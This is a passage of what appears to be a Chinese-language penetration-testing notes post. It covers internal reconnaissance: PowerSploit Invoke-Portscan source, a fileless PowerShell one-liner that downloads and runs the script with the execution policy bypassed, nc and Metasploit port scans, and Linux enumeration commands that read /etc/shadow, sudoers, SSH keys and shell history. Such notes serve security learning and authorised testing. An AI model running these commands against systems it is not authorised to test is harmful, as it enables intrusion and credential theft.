class="line">                    1 &#123;$nHosts=10;  $Threads = 32;   $Timeout = 5000 &#125;</span><br><span class="line">                    default &#123;</span><br><span class="line">                        throw &quot;Invalid T parameter&quot;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $grepStream = $null</span><br><span class="line">            $xmlStream = $null</span><br><span class="line">            $readableStream = $null</span><br><span class="line"></span><br><span class="line">            if($AllformatsOut)</span><br><span class="line">            &#123;</span><br><span class="line">                if ($GrepOut -or $XmlOut -or $ReadableOut) &#123;</span><br><span class="line">                     Write-Warning &quot;Both -oA specified with other output... going to ignore -oG/-oN/-oX&quot;</span><br><span class="line">                &#125;</span><br><span class="line">                $GrepOut = $AllformatsOut + &quot;.gnmap&quot;</span><br><span class="line">                $XmlOut = $AllformatsOut + &quot;.xml&quot;</span><br><span class="line">                $ReadableOut = $AllformatsOut + &quot;.nmap&quot;</span><br><span class="line">            &#125;</span><br><span class="line">            if ($GrepOut) &#123;</span><br><span class="line">                if (!$ForceOverwrite -and (Test-Path $GrepOut)) &#123;</span><br><span class="line">                    throw &quot;Error: $AllformatsOut already exists. Either delete the file or specify the -f flag&quot;</span><br><span class="line">                &#125;</span><br><span class="line">                $grepStream = [System.IO.StreamWriter] $GrepOut</span><br><span class="line">            &#125;</span><br><span class="line">            if ($ReadableOut) &#123;</span><br><span class="line">                if (!$ForceOverwrite -and (Test-Path $ReadableOut)) &#123;</span><br><span class="line">                    throw &quot;Error: $ReadableOut already exists. Either delete the file or specify the -f flag&quot;</span><br><span class="line">                &#125;</span><br><span class="line">                $readableStream = [System.IO.StreamWriter] $ReadableOut</span><br><span class="line">            &#125;</span><br><span class="line">            if ($XmlOut) &#123;</span><br><span class="line">                if (!$ForceOverwrite -and (Test-Path $XmlOut)) &#123;</span><br><span class="line">                    throw &quot;Error: $XmlOut already exists. Either delete the file or specify the -f flag&quot;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                $xmlStream =   [System.xml.xmlwriter]::Create([string]$XmlOut)</span><br><span class="line">                $xmlStream.WriteStartDocument()</span><br><span class="line">                $xmlStream.WriteStartElement(&quot;Portscanrun&quot;)</span><br><span class="line">                $xmlStream.WriteAttributeString(&quot;version&quot;, $version)</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Parse-Ports -Ports $DiscoveryPorts -pList $hostPortList | Out-Null</span><br><span class="line"></span><br><span class="line">            $startdate = Get-Date</span><br><span class="line">            $myInvocationLine = $PSCmdlet.MyInvocation.Line</span><br><span class="line">            $startMsg = &quot;Invoke-Portscan.ps1 v$version scan initiated $startdate as: $myInvocationLine&quot;</span><br><span class="line"></span><br><span class="line">            #TODO deal with output</span><br><span class="line">            Write-PortscanOut -comment $startMsg -grepStream $grepStream -xmlStream $xmlStream -readableStream $readableStream</span><br><span class="line"></span><br><span class="line">            # #converting back from int array gives some argument error checking</span><br><span class="line">            # $sPortList = [string]::join(&quot;,&quot;, $portList)</span><br><span class="line">            # $sHostPortList = [string]::join(&quot;,&quot;, $hostPortList)</span><br><span class="line"></span><br><span class="line">            ########</span><br><span class="line">            #Port Scan Code - run on a per host basis</span><br><span class="line">            ########</span><br><span class="line">            $portScanCode = &#123;</span><br><span class="line">                param (</span><br><span class="line">                    [Parameter( Mandatory = $True)] [string] $thost,</span><br><span class="line">                    [Parameter( Mandatory = $True)][bool] $SkipDiscovery,</span><br><span class="line">                    [Parameter( Mandatory = $True)][bool] $PingOnly,</span><br><span class="line">                    [Parameter( Mandatory = $True)][int] $Timeout,</span><br><span class="line">                    [Parameter( Mandatory = $True)] $PortList,</span><br><span class="line">                    [Parameter( Mandatory = $True)] $hostPortList,</span><br><span class="line">                    [Parameter( Mandatory = $True)][int] $maxthreads)</span><br><span class="line">                Process</span><br><span class="line">                &#123;</span><br><span class="line">                $openPorts = New-Object System.Collections.ArrayList</span><br><span class="line">                $closedPorts = New-Object System.Collections.ArrayList</span><br><span class="line">                $filteredPorts = New-Object System.Collections.ArrayList</span><br><span class="line"></span><br><span class="line">                $sockets = @&#123;&#125;</span><br><span class="line">                $timeouts = New-Object Hashtable</span><br><span class="line"></span><br><span class="line">                #set maximum $async threads</span><br><span class="line">                $fThreads = New-Object int</span><br><span class="line">                $aThreads = New-Object int</span><br><span class="line">                [System.Threading.ThreadPool]::GetMaxThreads([ref]$fThreads, [ref]$aThreads) | Out-Null</span><br><span class="line">                [System.Threading.ThreadPool]::SetMaxThreads($fthreads,$maxthreads) | Out-Null</span><br><span class="line"></span><br><span class="line">                function New-ScriptBlockCallback &#123;</span><br><span class="line">                    param(</span><br><span class="line">                        [parameter(Mandatory=$true)]</span><br><span class="line">                        [ValidateNotNullOrEmpty()]</span><br><span class="line">                        [scriptblock]$Callback</span><br><span class="line">                    )</span><br><span class="line"></span><br><span class="line">                    #taken from http://www.nivot.org/blog/post/2009/10/09/PowerShell20AsynchronousCallbacksFromNET</span><br><span class="line">                    if (-not (&quot;CallbackEventBridge&quot; -as [type])) &#123;</span><br><span class="line">                        Add-Type @&quot;</span><br><span class="line">                            using System;</span><br><span class="line"></span><br><span class="line">                            public sealed class CallbackEventBridge</span><br><span class="line">                            &#123;</span><br><span class="line">                                public event AsyncCallback CallbackComplete = delegate &#123; &#125;;</span><br><span class="line"></span><br><span class="line">                                private CallbackEventBridge() &#123;&#125;</span><br><span class="line"></span><br><span class="line">                                private void CallbackInternal(IAsyncResult result)</span><br><span class="line">                                &#123;</span><br><span class="line">                                    CallbackComplete(result);</span><br><span class="line">                                &#125;</span><br><span class="line"></span><br><span class="line">                                public AsyncCallback Callback</span><br><span class="line">                                &#123;</span><br><span class="line">                                    get &#123; return new AsyncCallback(CallbackInternal); &#125;</span><br><span class="line">                                &#125;</span><br><span class="line"></span><br><span class="line">                                public static CallbackEventBridge Create()</span><br><span class="line">                                &#123;</span><br><span class="line">                                    return new CallbackEventBridge();</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">&quot;@</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    $bridge = [CallbackEventBridge]::Create()</span><br><span class="line">                    Register-ObjectEvent -InputObject $bridge -EventName CallbackComplete -Action $Callback | Out-Null</span><br><span class="line"></span><br><span class="line">                    $bridge.Callback</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                function Test-Port &#123;</span><br><span class="line"></span><br><span class="line">                    Param (</span><br><span class="line">                        [Parameter(Mandatory = $True)] [String] $h,</span><br><span class="line">                        [Parameter(Mandatory = $True)] [int] $p,</span><br><span class="line">                        [Parameter(Mandatory = $True)] [int] $timeout</span><br><span class="line">                    )</span><br><span class="line"></span><br><span class="line">                    try &#123;</span><br><span class="line">                        $pAddress = [System.Net.IPAddress]::Parse($h)</span><br><span class="line">                        $sockets[$p] = new-object System.Net.Sockets.TcpClient $pAddress.AddressFamily</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line">                    catch &#123;</span><br><span class="line">                        #we&#x27;re assuming this is a host name</span><br><span class="line">                        $sockets[$p] = new-object System.Net.Sockets.TcpClient</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    $scriptBlockAsString = @&quot;</span><br><span class="line"></span><br><span class="line">                        #somewhat of a race condition with the timeout, but I don&#x27;t think it matters</span><br><span class="line">                        if ( `$sockets[$p] -ne `$NULL)</span><br><span class="line">                        &#123;</span><br><span class="line">                            if (!`$timeouts[$p].Disposed) &#123;</span><br><span class="line">                                `$timeouts[$p].Dispose()</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            `$status = `$sockets[$p].Connected;</span><br><span class="line">                            if (`$status -eq `$True)</span><br><span class="line">                            &#123;</span><br><span class="line">                                #write-host &quot;$p is open&quot;</span><br><span class="line">                                `$openPorts.Add($p)</span><br><span class="line">                            &#125;</span><br><span class="line">                            else</span><br><span class="line">                            &#123;</span><br><span class="line">                                #write-host &quot;$p is closed&quot;</span><br><span class="line">                                `$closedPorts.Add($p)</span><br><span class="line"></span><br><span class="line">                            &#125;</span><br><span class="line">                            `$sockets[$p].Close();</span><br><span class="line"></span><br><span class="line">                            `$sockets.Remove($p)</span><br><span class="line">                        &#125;</span><br><span class="line">&quot;@</span><br><span class="line">                    $timeoutCallback = @&quot;</span><br><span class="line">                        #write-host &quot;$p is filtered&quot;</span><br><span class="line">                        `$sockets[$p].Close()</span><br><span class="line">                        if (!`$timeouts[$p].Disposed) &#123;</span><br><span class="line">                            `$timeouts[$p].Dispose()</span><br><span class="line">                            `$filteredPorts.Add($p)</span><br><span class="line">                        &#125;</span><br><span class="line">                        `$sockets.Remove($p)</span><br><span class="line">&quot;@</span><br><span class="line"></span><br><span class="line">                    $timeoutCallback = [scriptblock]::Create($timeoutCallback)</span><br><span class="line"></span><br><span class="line">                    $timeouts[$p] = New-Object System.Timers.Timer</span><br><span class="line">                    Register-ObjectEvent -InputObject $timeouts[$p] -EventName Elapsed -Action $timeoutCallback | Out-Null</span><br><span class="line">                    $timeouts[$p].Interval = $timeout</span><br><span class="line">                    $timeouts[$p].Enabled = $true</span><br><span class="line"></span><br><span class="line">                    $myscriptblock = [scriptblock]::Create($scriptBlockAsString)</span><br><span class="line">                    $Null = $sockets[$p].beginConnect($h, $p,(New-ScriptBlockCallback($myscriptblock)) , $null)</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                function PortScan-Alive</span><br><span class="line">                &#123;</span><br><span class="line">                    Param (</span><br><span class="line">                        [Parameter(Mandatory = $True)] [String] $h</span><br><span class="line">                    )</span><br><span class="line"></span><br><span class="line">                    Try</span><br><span class="line">                    &#123;</span><br><span class="line"></span><br><span class="line">                        #ping</span><br><span class="line">                        if ($hostPortList.Contains(-1))</span><br><span class="line">                        &#123;</span><br><span class="line">                            $ping = new-object System.Net.NetworkInformation.Ping</span><br><span class="line">                            $pResult = $ping.send($h)</span><br><span class="line">                            if ($pResult.Status -eq &quot;Success&quot;)</span><br><span class="line">                            &#123;</span><br><span class="line">                                return $True</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        foreach($Port in $hostPortList)</span><br><span class="line">                        &#123;</span><br><span class="line">                            if ($Port -ne -1)</span><br><span class="line">                            &#123;</span><br><span class="line">                                Test-Port -h $h -p $Port -timeout $Timeout</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        do &#123;</span><br><span class="line">                            Start-Sleep -Milli 100</span><br><span class="line">                            if (($openPorts.Count -gt 0) -or ($closedPorts.Count -gt 0)) &#123;</span><br><span class="line">                                return $True</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        While ($sockets.Count -gt 0)</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line">                    Catch</span><br><span class="line">                    &#123;</span><br><span class="line">                        Write-Error &quot;Exception trying to host scan $h&quot;</span><br><span class="line">                        Write-Error $_.Exception.Message;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    return $False</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                function Portscan-Port</span><br><span class="line">                &#123;</span><br><span class="line">                    Param (</span><br><span class="line">                        [Parameter(Mandatory = $True)] [String] $h</span><br><span class="line">                    )</span><br><span class="line"></span><br><span class="line">                    [string[]]$Ports = @()</span><br><span class="line"></span><br><span class="line">                    foreach($Port in $Portlist)</span><br><span class="line">                    &#123;</span><br><span class="line">                        Try</span><br><span class="line">                        &#123;</span><br><span class="line">                            Test-Port -h $h -p $Port -timeout $Timeout</span><br><span class="line">                        &#125;</span><br><span class="line">                        Catch</span><br><span class="line">                        &#123;</span><br><span class="line">                            Write-Error &quot;Exception trying to scan $h port $Port&quot;</span><br><span class="line">                            Write-Error $_.Exception.Message;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                [bool] $hostResult = $False</span><br><span class="line"></span><br><span class="line">                if(!$SkipDiscovery)</span><br><span class="line">                &#123;</span><br><span class="line">                    [bool] $hostResult = PortScan-Alive $thost</span><br><span class="line">                    $openPorts.clear()</span><br><span class="line">                    $closedPorts.clear()</span><br><span class="line">                    $filteredPorts.Clear()</span><br><span class="line">                &#125;</span><br><span class="line">                if((!$PingOnly) -and ($hostResult -or $SkipDiscovery))</span><br><span class="line">                &#123;</span><br><span class="line">                    Portscan-Port $thost</span><br><span class="line">                &#125;</span><br><span class="line">                while ($sockets.Count -gt 0) &#123;</span><br><span class="line">                    Start-Sleep -Milli 500</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                return @($hostResult, $openPorts, $closedPorts, $filteredPorts)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            # the outer loop is to flush the loop.</span><br><span class="line">            # Otherwise Get-Job | Wait-Job could clog, etc</span><br><span class="line"></span><br><span class="line">            [int]$saveIteration = 0</span><br><span class="line">            [int]$computersDone=0</span><br><span class="line">            [int]$upHosts=0</span><br><span class="line">            while (($saveIteration * $SyncFreq) -lt $hostList.Count)</span><br><span class="line">            &#123;</span><br><span class="line"></span><br><span class="line">                Get-Job | Remove-Job -Force</span><br><span class="line">                $sIndex = ($saveIteration*$SyncFreq)</span><br><span class="line">                $eIndex = (($saveIteration+1)*$SyncFreq)-1</span><br><span class="line"></span><br><span class="line">                foreach ($iHost in $hostList[$sIndex..$eIndex])</span><br><span class="line">                &#123;</span><br><span class="line">                    $ctr = @(Get-Job -state Running)</span><br><span class="line">                    while ($ctr.Count -ge $nHosts)</span><br><span class="line">                    &#123;</span><br><span class="line">                        Start-Sleep -Milliseconds $SleepTimer</span><br><span class="line">                        $ctr = @(Get-Job -state Running)</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    $computersDone++</span><br><span class="line">                    if(!$noProgressMeter)</span><br><span class="line">                    &#123;</span><br><span class="line">                        Write-Progress -status &quot;Port Scanning&quot; -Activity $startMsg -CurrentOperation &quot;starting computer $computersDone&quot;  -PercentComplete ($computersDone / $hostList.Count * 100)</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    Start-Job -ScriptBlock $portScanCode -Name $iHost -ArgumentList @($iHost, $SkipDiscovery, $PingOnly, $Timeout, $portList, $hostPortList, $Threads)  | Out-Null</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                Get-Job | Wait-Job | Out-Null</span><br><span class="line"></span><br><span class="line">                foreach ($job in Get-Job)</span><br><span class="line">                &#123;</span><br><span class="line">                    $jobOut = @(Receive-Job $job)</span><br><span class="line">                    [bool]$hostUp = $jobOut[0]</span><br><span class="line">                    $jobName = $job.Name</span><br><span class="line"></span><br><span class="line">                    $openPorts = $jobOut[1]</span><br><span class="line">                    $closedPorts = $jobOut[2]</span><br><span class="line">                    $filteredPorts = $jobOut[3]</span><br><span class="line"></span><br><span class="line">                    if($hostUp) &#123;</span><br><span class="line">                        $upHosts ++</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    if (!$quiet)</span><br><span class="line">                    &#123;</span><br><span class="line">                        $hostDate = Get-Date</span><br><span class="line">                        $hostObj = New-Object System.Object</span><br><span class="line">                        $hostObj | Add-Member -MemberType Noteproperty -Name Hostname -Value $jobName</span><br><span class="line"></span><br><span class="line">                        $hostObj | Add-Member -MemberType Noteproperty -Name alive -Value $hostUp</span><br><span class="line">                        $hostObj | Add-Member -MemberType Noteproperty -Name openPorts -Value $openPorts</span><br><span class="line">                        $hostObj | Add-Member -MemberType Noteproperty -Name closedPorts -Value $closedPorts</span><br><span class="line">                        $hostObj | Add-Member -MemberType Noteproperty -Name filteredPorts -Value $filteredPorts</span><br><span class="line">                        $hostObj | Add-Member -MemberType NoteProperty -Name finishTime -Value $hostDate</span><br><span class="line"></span><br><span class="line">                        $scannedHostList += $hostobj</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    Write-PortscanOut -outhost $jobName -isUp $hostUp -openPorts $openPorts -closedPorts $closedPorts -filteredPorts $filteredPorts -grepStream $grepStream -xmlStream $xmlStream -readableStream $readableStream -SkipDiscovery $SkipDiscovery</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                if ($grepStream) &#123;</span><br><span class="line">                    $grepStream.flush()</span><br><span class="line">                &#125;</span><br><span class="line">                if ($xmlStream) &#123;</span><br><span class="line">                    $xmlStream.flush()</span><br><span class="line">                &#125;</span><br><span class="line">                if($readableStream) &#123;</span><br><span class="line">                    $readableStream.flush()</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                $saveIteration ++</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $enddate = Get-Date</span><br><span class="line">            $totaltime = ($enddate - $startdate).TotalSeconds</span><br><span class="line">            $endMsg = &quot;Port scan complete at $enddate ($totaltime seconds)&quot;</span><br><span class="line">            if (!$SkipDiscovery) &#123;</span><br><span class="line">                $endMsg += &quot;, $upHosts hosts are up&quot;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Write-PortscanOut -comment $endMsg -grepStream $grepStream -xmlStream $xmlStream -readableStream $readableStream</span><br><span class="line"></span><br><span class="line">            if($grepStream) &#123;</span><br><span class="line">                $grepStream.Close()</span><br><span class="line">            &#125;</span><br><span class="line">            if ($xmlStream) &#123;</span><br><span class="line">                $xmlStream.Close()</span><br><span class="line">            &#125;</span><br><span class="line">            if($readableStream) &#123;</span><br><span class="line">                $readableStream.Close()</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            return $scannedHostList</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        Catch</span><br><span class="line">        &#123;</span><br><span class="line">            Write-Error $_.Exception.Message;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>无文件落地</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1&#x27;);Invoke-Portscan -Hosts 192.168.7.7 -T 4 -ports &#x27;445,1433,80,8080,3389&#x27;&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>有文件落地</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -exec bypass -Command &quot;Import-Module ./Invoke- Portscan.ps1;Invoke-Portscan -Hosts 192.168.7.7 -T 4 -ports &#x27;445,1433,80,8080,3389&#x27;&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>Telnet</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet DC 22</span><br></pre></td></tr></table></figure>

<p><strong>MSF</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">search portscan</span><br><span class="line">use anxiliary/scanner/portscan/tcp</span><br></pre></td></tr></table></figure>

<p><strong>NC</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nc.exe -vv 192.168.7.7 3389</span><br><span class="line"></span><br><span class="line">nc.exe -rz -w 2 -vv 192.168.7.7 0-65535</span><br><span class="line"></span><br><span class="line">-r 随机指定本地与远端主机的通信端口</span><br><span class="line">-z 使用0输入/输出模式，只在扫描通信端口时使用</span><br><span class="line">-w&lt;超时秒数&gt; 设置等待连线的时间</span><br></pre></td></tr></table></figure>

<p><strong>fscan</strong></p>
<p><strong>scanline</strong></p>
<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><p>linux有域控的概念吗 我的看法是没有 但是可以配置对应的功能，或者加入域，这些是可以实现的</p>
<h2 id="获取内核，操作系统和设备信息"><a href="#获取内核，操作系统和设备信息" class="headerlink" title="获取内核，操作系统和设备信息"></a>获取内核，操作系统和设备信息</h2><ul>
<li>版本信息uname -a 所有版本<br>uname -r 内核版本信息<br>uname -n 系统主机名<br>uname -m Linux内核架构</li>
<li>内核信息cat &#x2F;proc&#x2F;version</li>
<li>CPU信息cat &#x2F;proc&#x2F;cpuinfo</li>
<li>发布信息cat &#x2F;etc&#x2F;*-release cat &#x2F;etc&#x2F;issue</li>
<li>主机名 hostname</li>
<li>文件系统df -a</li>
<li>内核日志dmesg &#x2F; &#x2F;var&#x2F;log&#x2F;dmesg</li>
</ul>
<h2 id="用户和组"><a href="#用户和组" class="headerlink" title="用户和组"></a>用户和组</h2><ul>
<li>列出系统所有用户cat &#x2F;etc&#x2F;passwd</li>
<li>列出系统所有组cat &#x2F;etc&#x2F;group</li>
<li>列出所有用户hash（root）cat &#x2F;etc&#x2F;shadow</li>
<li>用户查询用户的基本信息finger当前登录的用户users<br>who -a<br>&#x2F;var&#x2F;log&#x2F;utmp查询无密码用户grep ‘x:0:’ &#x2F;etc&#x2F;passwd</li>
<li>目前登录的用户w</li>
<li>登入过的用户信息last &#x2F; &#x2F;var&#x2F;log&#x2F;wtmp var&#x2F;www&#x2F;html</li>
<li>显示系统中所有用户最近一次登录信息lastlog</li>
<li>登录成功日志&#x2F;var&#x2F;log&#x2F;secure</li>
<li>登录失败日志&#x2F;var&#x2F;log&#x2F;faillog</li>
<li>查看特权用户grep :0 &#x2F;etc&#x2F;passwd</li>
<li>查看passwd最后修改时间ls -l &#x2F;etc&#x2F;passwd</li>
<li>查看是否存在空口令用户awk -F: ‘length($2)&#x3D;&#x3D;0 {print $1}’ &#x2F;etc&#x2F;shadow</li>
<li>查看远程登录的账号awk ‘&#x2F;$1|$6&#x2F;{print $1}’ &#x2F;etc&#x2F;shadow</li>
<li>查看具有sudo权限的用户cat &#x2F;etc&#x2F;sudoers | grep -v “^#|^$” | grep “ALL&#x3D;(ALL)”</li>
</ul>
<h2 id="用户和权限信息"><a href="#用户和权限信息" class="headerlink" title="用户和权限信息"></a>用户和权限信息</h2><ul>
<li>当前用户 whoami</li>
<li>当前用户信息 id</li>
<li>可以使用sudo提升到root的用户（root） cat &#x2F;etc&#x2F;sudoers</li>
<li>列出目前用户可执行与无法执行的指令 sudo -l</li>
</ul>
<h2 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h2><ul>
<li>打印系统环境信息 env</li>
<li>打印系统环境信息 set</li>
<li>环境变量中的路径信息 echo $PATH</li>
<li>打印历史命令 history &#x2F; ~&#x2F;.bash_history</li>
<li>显示当前路径 pwd</li>
<li>显示默认系统遍历 cat &#x2F;etc&#x2F;profile</li>
<li>显示可用的shell cat &#x2F;etc&#x2F;shells</li>
</ul>
<h2 id="进程信息"><a href="#进程信息" class="headerlink" title="进程信息"></a>进程信息</h2><ul>
<li>查看进程信息 ps aux</li>
<li>资源占有情况 top -c</li>
<li>查看进程关联文件 lsof -c $PID</li>
<li>完整命令行信息 &#x2F;proc&#x2F;$PID&#x2F;cmdline</li>
<li>进程的命令名&#x2F;proc&#x2F;$PID&#x2F;comm</li>
<li>进程当前工作目录的符号链接 &#x2F;proc&#x2F;$PID&#x2F;cwd</li>
<li>运行程序的符号链接 &#x2F;proc&#x2F;$PID&#x2F;exe</li>
<li>进程的环境变量 &#x2F;proc&#x2F;$PID&#x2F;environ</li>
<li>进程打开文件的情况&#x2F;proc&#x2F;$PID&#x2F;fd</li>
</ul>
<h2 id="服务信息"><a href="#服务信息" class="headerlink" title="服务信息"></a>服务信息</h2><ul>
<li>由inetd管理的服务列表 cat &#x2F;etc&#x2F;inetd.conf</li>
<li>由xinetd管理的服务列表 cat &#x2F;etc&#x2F;xinetd.conf</li>
<li>nfs服务器的配置 cat &#x2F;etc&#x2F;exports</li>
<li>邮件信息 &#x2F;var&#x2F;log&#x2F;mailog</li>
<li>ssh配置 sshd_config</li>
</ul>
<h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h2><ul>
<li>显示指定用户的计划作业（root） crontab -l -u %user%</li>
<li>计划任务&#x2F;var&#x2F;spool&#x2F;cron&#x2F;*<br>&#x2F;var&#x2F;spool&#x2F;anacron&#x2F;*<br>&#x2F;etc&#x2F;crontab<br>&#x2F;etc&#x2F;anacrontab<br>&#x2F;etc&#x2F;cron.*<br>&#x2F;etc&#x2F;anacrontab</li>
<li>开机启动项&#x2F;etc&#x2F;rc.d&#x2F;init.d&#x2F;</li>
</ul>
<h2 id="网络、路由和通信"><a href="#网络、路由和通信" class="headerlink" title="网络、路由和通信"></a>网络、路由和通信</h2><ul>
<li>列出网络接口信息&#x2F;sbin&#x2F;ifconfig -a &#x2F; ip addr show</li>
<li>列出网络接口信息cat &#x2F;etc&#x2F;network&#x2F;interfaces</li>
<li>查看系统arp表arp -a</li>
<li>打印路由信息route &#x2F; ip ro show</li>
<li>查看dns配置信息cat &#x2F;etc&#x2F;resolv.conf</li>
<li>打印本地端口开放信息netstat -an</li>
<li>列出iptable的配置规则 iptables -L</li>
<li>查看端口服务映射cat &#x2F;etc&#x2F;services</li>
<li>Hostnamehostname -f</li>
<li>查看进程端口情况netstat -anltp | grep $PID</li>
</ul>
<h2 id="已安装程序"><a href="#已安装程序" class="headerlink" title="已安装程序"></a>已安装程序</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">rpm -qa --last Redhat</span><br><span class="line"></span><br><span class="line">yum list | grep installed CentOS</span><br><span class="line"></span><br><span class="line">ls -l /etc/yum.repos.d/</span><br><span class="line"></span><br><span class="line">dpkg -l Debian</span><br><span class="line"></span><br><span class="line">cat /etc/apt/sources.list Debian APT</span><br><span class="line"></span><br><span class="line">pkg_info xBSD</span><br><span class="line"></span><br><span class="line">pkginfo Solaris</span><br><span class="line"></span><br><span class="line">pacman -Q Arch Linux</span><br><span class="line"></span><br><span class="line">emerge Gentoo</span><br></pre></td></tr></table></figure>

<h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><ul>
<li>最近五天的文件find &#x2F; -ctime +1 -ctime -5</li>
<li>文件系统细节debugfs</li>
</ul>
<h2 id="公私钥信息"><a href="#公私钥信息" class="headerlink" title="公私钥信息"></a>公私钥信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">~/.ssh</span><br><span class="line"></span><br><span class="line">/etc/ssh</span><br></pre></td></tr></table></figure>

<h2 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/var/log/boot.log</span><br><span class="line">/var/log/cron</span><br><span class="line">/var/log/faillog</span><br><span class="line">/var/log/lastlog</span><br><span class="line">/var/log/messages</span><br><span class="line">/var/log/secure</span><br><span class="line">/var/log/syslog</span><br><span class="line">/var/log/syslog</span><br><span class="line">/var/log/wtmp</span><br><span class="line">/var/log/wtmp</span><br><span class="line">/var/run/utmp</span><br></pre></td></tr></table></figure>

<h2 id="虚拟环境检测"><a href="#虚拟环境检测" class="headerlink" title="虚拟环境检测"></a>虚拟环境检测</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lsmod | grep -i &quot;vboxsf\|vboxguest&quot;</span><br><span class="line">lsmod | grep -i &quot;vmw_baloon\|vmxnet&quot;</span><br><span class="line">lsmod | grep -i &quot;xen-vbd\|xen-vnif&quot;</span><br><span class="line">lsmod | grep -i &quot;virtio_pci\|virtio_net&quot;</span><br><span class="line">lsmod | grep -i &quot;hv_vmbus\|hv_blkvsc\|hv_netvsc\|hv_utils\|hv_storvsc&quot;</span><br></pre></td></tr></table></figure>

<h2 id="容器内信息收集"><a href="#容器内信息收集" class="headerlink" title="容器内信息收集"></a>容器内信息收集</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">capsh --print</span><br><span class="line">cat /proc/1/cgroup</span><br><span class="line">env | grep KUBE</span><br><span class="line">ls -l .dockerenv</span><br><span class="line">ls -l /run/secrets/Kubernetes.io/</span><br><span class="line">mount</span><br><span class="line">ps aux</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
